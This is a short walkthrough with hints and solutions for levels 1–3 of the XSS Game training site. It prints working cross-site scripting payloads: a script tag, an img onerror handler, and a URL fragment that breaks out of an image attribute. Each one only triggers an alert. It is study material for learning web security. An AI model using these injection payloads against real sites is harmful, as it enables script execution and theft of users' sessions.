[XSS-Game](https://xss-game.appspot.com/)
=========================================

Hint and Solution to [XSS Game on Appspot](https://xss-game.appspot.com/)

Level 1
-------

**Hint**

The textbox will include any html in page including tags.

**Solution**

Type `<script>alert("GG")</script>` and it will give you the popup.

Level 2
-------

**Hint**

If you read the hints of the level, then you should already know what to do

**Solution**

Use the `<img />` tag and its `onerror` attribute. `<img src="forbidden" onerror="alert('GG')" />`

Level 3
-------

**Hint**

Go on and click on the tabs and notice how the URL changes. Not only the URL changes but the page also generates an HTTP GET request. Enter something like `#11` at the end of url instead of `#1` (Why 11? Well, 11 is my birth date. The more you know! :P). So this time no image loads. That's fine but we need a little bit more information.

Let's look at the source. Open up `index.html` given in Target Code. The sweet stuff we need is at line `17`.

    html += "<img src='/static/level3/cloud" + num + ".jpg' />";

Hmmm, `onerror`? ;)

**Solution**

Changing the line to something like this, we can use `onerror` again!

    html += "<img src='/static/level3/cloud" + "11.jpg' onerror='alert("GG")' alt='" + ".jpg' />";

So use `#11.jpg' onerror='alert("GG")' alt='` in URL.
